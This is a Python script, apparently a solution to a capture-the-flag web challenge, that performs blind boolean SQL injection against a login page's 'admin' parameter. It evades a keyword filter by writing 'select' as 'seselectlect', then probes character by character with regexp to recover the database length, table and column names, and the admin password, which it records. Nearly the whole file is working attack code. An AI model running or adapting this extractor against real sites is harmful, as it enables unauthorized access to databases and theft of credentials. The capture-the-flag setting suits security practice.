#-*- coding:utf-8 -*-

import requests
import string

csets = string.ascii_lowercase+string.digits+',_@!'
url_mode = "http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' %s #&pass=1&action=login"
real_state = "登录失败"
GET_TABLE_NAME = "select group_concat(table_name,'@') from information_schema.tables where table_schema=database()"
GET_COLUMN_NAME = "select group_concat(column_name) from information_schema.columns where table_name='%s'"
def extract(url):
    new_url = url.replace('select','seselectlect').replace('#','%23')
    #print("new_url:"+new_url)
    return new_url

def get_content(poc):
    url = extract(url_mode%(poc))
    r = requests.get(url)
    content = r.content.decode("GB2312")
    return content

#查数据库长度（非必须）
'''
for i in range(20):
    poc="and length(database())=%d"
    poc=poc%i
    content = get_content(poc)
    if real_state in content:
        print("len:%d"%i)
        break
'''
database_len = 4

#查表长度和表名
'''
for i in range(20):
    poc = 'and length((%s)) = %d'
    poc = poc%(GET_TABLE_NAME,i)
    content = get_content(poc)
    if real_state in content:
        print("len:%d"%i)
        break
'''
table_name_len = 5
#获取表名
'''
strs = '@'
for i in range(5):
    for c in csets:
        poc = "and (select (%s) regexp '%s$')"
        poc = poc%(GET_TABLE_NAME,(c+strs))
        content = get_content(poc)
        if real_state in content:
            strs = c + strs
            print(strs)
            break
'''
#admin' and (select (select substr(group_concat(table_name,'@'),1,1) from information_schema.tables where table_schema=database()) > 'a') #
table_name='admin'

#获取列名总长度
'''
for i in range(20):
        poc = "and length((%s)) = %d"
        tmp = GET_COLUMN_NAME % table_name
        poc = poc %(tmp,i)
        content = get_content(poc)
        if real_state in content:
                print(i)
                break
'''
column_len = 17

#获取列名
'''
strs = ''
poc = "and (select ((%s)) regexp '%s$')"
for i in range(column_len):
        for c in csets:
                tmp = GET_COLUMN_NAME %table_name
                tmp = poc %(tmp,c+strs)
                content = get_content(tmp)
                if real_state in content:
                        strs = c + strs
                        print(strs)
                        break
'''

column_name = 'username,password'
strs = ''
flag = False
while not flag:
        flag = True
        for c in csets:
                poc = "and (select ((select password from admin limit 0,1)) regexp '%s$')"
                poc = poc %(c+strs)
                content = get_content(poc)
                if real_state in content:
                        strs = c+strs
                        flag = False
                        print(strs)

password="idnuenna"

